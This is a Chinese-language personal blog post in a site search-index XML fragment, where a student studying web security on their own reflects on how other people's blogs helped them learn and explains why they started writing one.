        <content type="html"><![CDATA[<h2 id="谈谈博客对我的影响">谈谈博客对我的影响</h2><p>本人是一名在读大三的学生，这是我写的第一篇博客文章，经过一番折腾后，虽然中间有点小插曲，但是我还是顺利地完成好搭建这个属于我个人的博客，作为一名长期以自学为主的人来说，我的知识的积累和技术的成长很大程度都离不开博客，先是因为学校无法提供偏技术这方面的培养，我便开始了一段独立且漫长的自学历程，由于我是web安全为主要方向学习，在我个人自学和结合靶场训练的过程，遇到问题也常有的事情，很多时候就去网上查资料学习，这时候我一般去阅读别人的博客文章，看别人是怎么解决问题，思路是怎么样的，涉及那些具体的知识点，我都比较地阅读。慢慢地，就会有一定的知识的积累和对问题解决的方法，当然，像技能的提升种肯定是离不开稳扎稳打的训练。我非常感谢别人的对自己个人知识和技术的分享，以及一些问题的解决，写成博客文章，供大家学习，这种分享的精神，我觉得是非常宝贵和伟大的，想必大多数计算机相关的学习者和我都一样，博客对我们的知识的积累和技术的成长有一定的影响的。</p><h2 id="希望自己也能成为影响他人的人">希望自己也能成为影响他人的人</h2><p>由于自己在学习的过程中有经常记笔记的习惯，并且积累了一定个人自学笔记，我也希望自己写出一些博客文章，供大家作学习参考，这是我个人搭建博客的想法和初衷，如果你觉得我的博客文章写得不错，或者某部分细节能解决你手上棘手的问题的话，你也可以关注一下我的博客，我会尽个人所能写好每一篇博客文章，原创不易，也非常期待你的小赏喔。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
